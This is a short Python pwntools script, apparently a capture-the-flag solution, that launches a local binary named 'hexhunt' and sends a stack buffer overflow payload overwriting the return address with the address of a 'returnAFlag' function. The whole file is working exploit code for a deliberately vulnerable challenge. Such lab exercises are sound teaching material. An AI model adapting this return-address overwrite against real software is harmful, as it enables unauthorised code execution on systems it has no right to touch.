import pwn

# Solution for Upgrade function

# prepare arguments for Upgrade function and start pwn session
args = ['./hexhunt', '-r', 'ntu.edu.sg']
p = pwn.process(args)
elf = pwn.ELF(p.argv[0])

# find the address that stores the flag
returnAFlag_addr = elf.symbols['returnAFlag']
print(f"win_addr={hex(returnAFlag_addr)}")

# send payload that overwrites the return address of the calling function
# with that of the returnAFlag address
payload = b"a" * 16 + pwn.p64(0) + pwn.p64(returnAFlag_addr)
print(payload)

p.sendline(payload)
p.interactive()